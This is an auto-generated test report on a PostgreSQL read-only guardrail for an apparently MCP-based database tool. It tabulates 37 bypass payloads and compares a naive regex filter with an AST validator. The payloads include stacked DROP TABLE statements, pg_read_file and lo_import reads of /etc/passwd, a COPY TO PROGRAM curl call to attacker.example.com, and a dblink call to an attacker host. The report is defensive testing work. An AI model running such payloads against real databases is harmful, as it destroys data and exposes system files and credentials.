# Guardrail bypass report

Auto-generated by `scripts/bypass_report.py`. Every payload below is
re-executed against the live validator, so this file cannot drift from
the implementation.

Each attempt is a documented technique for escaping a naive read-only
SQL filter. The column that matters is **Control** — a refusal for the
wrong structural reason is a latent bypass waiting for a schema change,
so the test suite asserts the specific control, not merely that
something raised.

## Why an AST and not a regex

The `Naive filter` column applies a representative hand-rolled guard:
"must start with SELECT, must not contain a write keyword". It is the
shape most of these are written in, and it fails **open** — anything the
pattern misses is permitted.

| # | Attack | Payload | Naive filter | AST guardrail | Control |
|--:|--------|---------|--------------|---------------|---------|
| 1 | stacked write | `SELECT 1; DROP TABLE orders` | refused | refused | `single-statement` |
| 2 | stacked with comment | `SELECT 1; -- x DELETE FROM orders` | refused | refused | `single-statement` |
| 3 | trailing semicolon write | `SELECT id FROM orders; UPDATE orders SET status='x'` | refused | refused | `single-statement` |
| 4 | CTE insert | `WITH w AS (INSERT INTO orders (status) VALUES ('x') RETURNING id) …` | refused | refused | `read-only` |
| 5 | CTE update | `WITH w AS (UPDATE orders SET status='x' RETURNING id) SELECT * FRO…` | refused | refused | `read-only` |
| 6 | CTE delete | `WITH w AS (DELETE FROM orders RETURNING id) SELECT * FROM w` | refused | refused | `read-only` |
| 7 | plain insert | `INSERT INTO orders (status) VALUES ('x')` | refused | refused | `read-only` |
| 8 | plain update | `UPDATE orders SET status='x'` | refused | refused | `read-only` |
| 9 | plain delete | `DELETE FROM orders` | refused | refused | `read-only` |
| 10 | truncate | `TRUNCATE orders` | refused | refused | `read-only` |
| 11 | drop | `DROP TABLE orders` | refused | refused | `read-only` |
| 12 | create | `CREATE TABLE evil (id int)` | refused | refused | `read-only` |
| 13 | alter | `ALTER TABLE orders ADD COLUMN evil text` | refused | refused | `read-only` |
| 14 | grant | `GRANT SELECT ON orders TO PUBLIC` | refused | refused | `read-only` |
| 15 | merge | `MERGE INTO orders USING products ON true WHEN MATCHED THEN DELETE` | refused | refused | `read-only` |
| 16 | select into | `SELECT * INTO evil FROM orders` | **ALLOWED** | refused | `read-only` |
| 17 | set role | `SET ROLE postgres` | refused | refused | `read-only` |
| 18 | set search_path | `SET search_path TO public` | refused | refused | `read-only` |
| 19 | copy to program | `COPY (SELECT 1) TO PROGRAM 'curl attacker.example.com'` | refused | refused | `read-only` |
| 20 | copy from file | `COPY orders FROM '/etc/passwd'` | refused | refused | `read-only` |
| 21 | pg_read_file | `SELECT pg_read_file('/etc/passwd')` | **ALLOWED** | refused | `function-denylist` |
| 22 | schema-qualified pg_read_file | `SELECT pg_catalog.pg_read_file('/etc/passwd')` | **ALLOWED** | refused | `function-denylist` |
| 23 | pg_ls_dir | `SELECT pg_ls_dir('/')` | **ALLOWED** | refused | `function-denylist` |
| 24 | lo_import | `SELECT lo_import('/etc/passwd')` | **ALLOWED** | refused | `function-denylist` |
| 25 | dblink | `SELECT dblink('host=attacker', 'SELECT 1')` | **ALLOWED** | refused | `function-denylist` |
| 26 | pg_sleep DoS | `SELECT pg_sleep(60)` | **ALLOWED** | refused | `function-denylist` |
| 27 | current_setting probe | `SELECT current_setting('pharmacy.mask_salt')` | **ALLOWED** | refused | `function-denylist` |
| 28 | nested denied function | `SELECT id FROM orders WHERE status = pg_read_file('/etc/passwd')` | **ALLOWED** | refused | `function-denylist` |
| 29 | for update | `SELECT * FROM orders FOR UPDATE` | refused | refused | `no-locking` |
| 30 | raw customers | `SELECT * FROM customers` | **ALLOWED** | refused | `relation-allowlist` |
| 31 | raw prescriptions | `SELECT * FROM prescriptions` | **ALLOWED** | refused | `relation-allowlist` |
| 32 | system catalog | `SELECT * FROM pg_authid` | **ALLOWED** | refused | `relation-allowlist` |
| 33 | union with denied relation | `SELECT id FROM orders UNION SELECT id FROM customers` | **ALLOWED** | refused | `relation-allowlist` |
| 34 | subquery with denied relation | `SELECT id FROM orders WHERE customer_id IN (SELECT id FROM custome…` | **ALLOWED** | refused | `relation-allowlist` |
| 35 | comment-split keyword | `SEL/**/ECT 1` | refused | refused | `sql-parse` |
| 36 | empty | `` | refused | refused | `sql-parse` |
| 37 | whitespace only | `    	 ` | refused | refused | `sql-parse` |

## Statements that must remain permitted

A guardrail that refuses everything is trivially 'secure' and useless.
These pin the other edge — each must pass, and each is silently given a
`LIMIT`.

| Query | Result |
|-------|--------|
| simple select | permitted, `LIMIT` enforced |
| join across allowed relations | permitted, `LIMIT` enforced |
| masked customer view | permitted, `LIMIT` enforced |
| masked prescription view | permitted, `LIMIT` enforced |
| aggregate | permitted, `LIMIT` enforced |
| CTE that is genuinely read-only | permitted, `LIMIT` enforced |
| union of allowed relations | permitted, `LIMIT` enforced |

## Summary

- Attack payloads tested: **37**
- Refused by the AST guardrail: **37**
- Would have passed the naive regex filter: **14** (37%)

### Refusals by control

| Control | Count | What it catches |
|---------|------:|-----------------|
| `read-only` | 17 | any mutating node anywhere in the parse tree |
| `function-denylist` | 8 | filesystem, network, and DoS functions by resolved name |
| `relation-allowlist` | 5 | reads against tables outside the permitted set |
| `single-statement` | 3 | stacked statements (`SELECT 1; DROP …`) |
| `sql-parse` | 3 | input that will not parse — never executed to find out |
| `no-locking` | 1 | `FOR UPDATE` / `FOR SHARE` row locks |

### Payloads the naive filter would have let through

- select into
- pg_read_file
- schema-qualified pg_read_file
- pg_ls_dir
- lo_import
- dblink
- pg_sleep DoS
- current_setting probe
- nested denied function
- raw customers
- raw prescriptions
- system catalog
- union with denied relation
- subquery with denied relation

## Defence in depth

This layer is the second of three, and it is not the last:

1. `mcp_core` — protocol shape and tool allowlist
2. `guardrails.py` — this report
3. the `mcp_readonly` database role — see `db-privilege-proof.txt`

Layer 3 exists because layer 2 can have bugs. Every payload above is
*also* refused by PostgreSQL itself, with the application entirely out
of the picture. The guardrail's job is a fast, legible refusal the model
can act on; the grant is what makes the refusal true.
